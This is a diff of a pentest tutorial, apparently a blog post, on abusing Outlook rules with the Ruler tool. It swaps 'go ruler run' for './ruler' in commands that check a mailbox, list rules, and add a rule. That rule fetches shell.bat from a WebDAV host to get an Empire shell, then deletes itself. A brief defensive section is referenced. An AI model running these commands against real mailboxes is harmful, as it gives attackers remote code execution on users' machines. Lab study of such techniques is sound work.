@@ -34,7 +34,7 @@ once we know the mail structure,added dns records etc we can start by checking w
 depends on how you compile ruler it may be different than the syntax below
 
 ```
-go ruler run --email test@lab.local --verbose check
+./ruler --email test@lab.local --verbose check
 ```
 
 once executed we will get a password prompt,if everything is valid we should get a messsage stating that the mailbox has been opened and that we are good to go.
@@ -42,7 +42,7 @@ once executed we will get a password prompt,if everything is valid we should get
 ### Viewing Existing Rules :
 
 ```
-go ruler run --email test@lab.local display
+./ruler --email test@lab.local display
 ```
 
 ### Setting up an Empire Listener
@@ -58,7 +58,7 @@ ill update this method in the future.
 ### Creating the rule
 
 ```
-go ruler run --email test@lab.local add --name test --trigger shell --location "\\\\webdav.test\\webdav\shell.bat" --send
+./ruler --email test@lab.local add --name test --trigger shell --location "\\\\webdav.test\\webdav\shell.bat" --send
 ```
 
 this command basically gonna send an email to the user inbox and trigger our rule when that happens we should shortly after recieve our empire shell.
@@ -69,7 +69,7 @@ now its worth mentioning that the user wont see the mail in his sent items since
 
 once we are done we can delete
 
-`go ruler run  --email test@lab.local delete --name test`
+`./ruler  --email test@lab.local delete --name test`
 
 ### Defending against Ruler
 
@@ -88,10 +88,6 @@ You will need to have a global admin role to run the script
 ### Closing Thoughts
 
 with ruler we can pop a shell and pivot across the network its a great tool that has alot to explore what i showed here is a just one of the things its capable of doing i suggest you to explore the rest of it and get better understanding of its true power.
-
-
-
-
 
 Written by : ~~**BufferOv3rride**~~
 
